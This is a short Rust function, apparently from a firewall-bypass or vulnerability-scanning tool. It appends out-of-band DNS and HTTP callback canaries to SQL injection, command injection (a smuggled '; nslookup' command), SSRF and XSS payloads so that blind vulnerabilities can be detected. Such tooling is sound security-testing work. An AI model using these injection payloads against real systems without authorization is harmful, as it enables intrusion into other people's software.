use wafrift_types::oob::OobCanary;

pub fn embed_canary(payload: &str, canary: &OobCanary, payload_type: &str) -> String {
    match payload_type {
        "Sql" => format!(
            "{} LOAD_FILE('\\\\\\\\{}\\\\a')",
            payload, canary.expected_dns
        ),
        "CommandInjection" => format!("{}; nslookup {}", payload, canary.expected_dns),
        "Ssrf" => format!(
            "http://{}/{}",
            canary.expected_dns, canary.expected_http_path
        ),
        "Xss" => format!(
            "<img src=\"//{}/{}\">",
            canary.expected_dns, canary.expected_http_path
        ),
        _ => payload.to_string(),
    }
}
